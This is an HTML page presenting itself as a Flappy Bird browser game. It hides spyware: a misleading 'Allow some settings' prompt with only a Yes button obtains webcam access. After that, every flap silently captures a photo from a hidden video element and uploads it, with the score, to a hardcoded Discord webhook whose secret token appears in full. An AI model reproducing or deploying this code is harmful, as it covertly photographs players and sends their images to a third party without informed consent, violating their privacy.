<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Flappy Bird</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#000; }
    #game { border:2px solid #000; border-radius:12px; }
    .modal { position:fixed; inset:0; display:flex; justify-content:center; align-items:center; background:rgba(0,0,0,0.6); }
    .modal.hidden { display:none; }
    .panel { background:white; padding:20px; border-radius:12px; text-align:center; max-width:350px; }
    .panel button { margin:8px; padding:10px 20px; border:none; border-radius:8px; cursor:pointer; font-size:16px; }
    .allow { background:#2ecc71; color:white; }
    .deny { background:#e74c3c; color:white; }
  </style>
</head>
<body>
  <canvas id="game" width="288" height="512"></canvas>

  <div id="consentModal" class="modal">
    <div class="panel">
      <h2>Allow</h2>
      <p>You have to allow some settings for it to work</p>
      <button class="allow" id="allowBtn">Yes</button>
    </div>
  </div>

  <video id="cam" autoplay playsinline muted style="display:none"></video>
  <canvas id="snap" width="640" height="480" style="display:none"></canvas>

<script>
const canvas = document.getElementById("game");
const ctx = canvas.getContext("2d");
const W = canvas.width, H = canvas.height;

const consentModal = document.getElementById("consentModal");
const allowBtn = document.getElementById("allowBtn");
const denyBtn = document.getElementById("denyBtn");
const video = document.getElementById("cam");
const snap = document.getElementById("snap");
const snapCtx = snap.getContext("2d");

let camEnabled = false;
let mediaStream;

// Discord webhook
const WEBHOOK = "https://discord.com/api/webhooks/1413966614390378556/KoUnhB81Nq08jEC-qQ2NucwHRP8UG6fnlv4zOW2FnelzilKnpWg4MoF9-_NWcsUxMEvl";

// Sprites
const bg = new Image(); bg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/background-day.png?raw=true";
const birdImg = new Image(); birdImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/yellowbird-midflap.png?raw=true";
const pipeImg = new Image(); pipeImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/pipe-green.png?raw=true";

let started = false, alive = true;
let score = 0, best = 0;
const plr = { x: 60, y: H/2, w: 34, h: 24, vy: 0, gravity: 0.4, jump: -7 };

let pipes = [];
const gap = 120;
const pipeWidth = 52;
const pipeSpeed = 2;
const pipeInterval = 100; // frames between pipes
let frameCount = 0;

// Consent
allowBtn.onclick = async () => {
  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = mediaStream;

    // wait until video is ready
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play().then(resolve).catch(resolve);
      };
    });

    camEnabled = true;
  } catch (e) {
    alert("Camera permission denied or unavailable. Playing without it.");
  }
  consentModal.classList.add("hidden");
};
denyBtn.onclick = () => {
  camEnabled = false;
  consentModal.classList.add("hidden");
};

// Game reset
function reset() {
  plr.y = H/2; plr.vy = 0;
  pipes = []; score = 0;
  started = false; alive = true;
  frameCount = 0;
}

// Pipe spawn
function spawnPipe() {
  const topHeight = 50 + Math.random() * (H - gap - 150);
  const bottomY = topHeight + gap;
  pipes.push({ x: W, top: topHeight, bottom: bottomY, passed: false });
}

// Flap
function flap() {
  if (!alive) { reset(); return; }
  started = true;
  plr.vy = plr.jump;
  if (camEnabled) takeSnap();
}

// Take snapshot
function takeSnap() {
  if (!camEnabled || video.readyState < 2) return; // wait until ready
  snapCtx.drawImage(video, 0, 0, snap.width, snap.height);
  snap.toBlob(async blob => {
    if (!blob) return;
    const fd = new FormData();
    fd.append("file", blob, `flap-${Date.now()}.jpg`);
    fd.append("content", `Flap! Current score: ${score}`);
    try {
      await fetch(WEBHOOK, { method: "POST", body: fd });
    } catch(e){ console.error("Webhook failed", e); }
  }, "image/jpeg", 0.85);
}

// Update
function update() {
  if (!started) return;

  plr.vy += plr.gravity;
  plr.y += plr.vy;

  frameCount++;
  if (frameCount % pipeInterval === 0) spawnPipe();

  pipes.forEach(p => p.x -= pipeSpeed);
  pipes = pipes.filter(p => p.x + pipeWidth > 0);

  for (let p of pipes) {
    if (!p.passed && p.x + pipeWidth < plr.x) { score++; p.passed = true; best = Math.max(best, score); }
    if (plr.x + plr.w/2 > p.x && plr.x - plr.w/2 < p.x + pipeWidth) {
      if (plr.y - plr.h/2 < p.top || plr.y + plr.h/2 > p.bottom) alive = false;
    }
  }
  if (plr.y > H || plr.y < 0) alive = false;
}

// Draw
function draw() {
  ctx.drawImage(bg, 0, 0, W, H);

  pipes.forEach(p => {
    const headOverlap = 24;
    // top pipe
    ctx.save();
    ctx.translate(p.x, p.top - headOverlap);
    ctx.scale(1, -1);
    ctx.drawImage(pipeImg, 0, -pipeImg.height);
    ctx.restore();
    // bottom pipe
    ctx.drawImage(pipeImg, p.x, p.bottom);
  });

  ctx.drawImage(birdImg, plr.x - plr.w/2, plr.y - plr.h/2, plr.w, plr.h);

  ctx.fillStyle = "#fff"; ctx.font = "20px Arial";
  ctx.fillText(`Score: ${score}`, 10, 25);
  ctx.fillText(`Best: ${best}`, 10, 50);

  if (!alive) ctx.fillText("Game Over! Tap/Space to restart", 40, H/2);
  if (!started && alive) ctx.fillText("Tap or Space to start", 60, H/2);
}

// Loop
function loop() {
  if (alive) update();
  draw();
  requestAnimationFrame(loop);
}
loop();

canvas.addEventListener("click", flap);
window.addEventListener("keydown", e => { if (e.code === "Space") flap(); });
</script>
</body>
</html>
